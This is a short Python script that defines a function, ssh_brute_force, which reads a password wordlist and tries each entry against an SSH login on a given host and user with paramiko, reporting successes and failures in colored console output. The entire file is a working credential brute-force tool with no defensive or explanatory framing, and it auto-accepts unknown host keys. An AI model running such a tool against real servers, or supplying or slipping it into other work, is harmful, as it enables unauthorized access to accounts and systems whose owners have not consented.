import paramiko
from rich.console import Console

console = Console()

def ssh_brute_force(host, user, wordlist):
    with open(wordlist, 'r') as file:
        for password in file:
            password = password.strip()
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(host, username=user, password=password, timeout=3)
                console.print(f"[green]Success: {user}@{host} with password: {password}[/green]")
                ssh.close()
                return
            except:
                console.print(f"[red]Failed: {password}[/red]")
    console.print("[bold red]Brute-force finished. Password not found.[/bold red]")
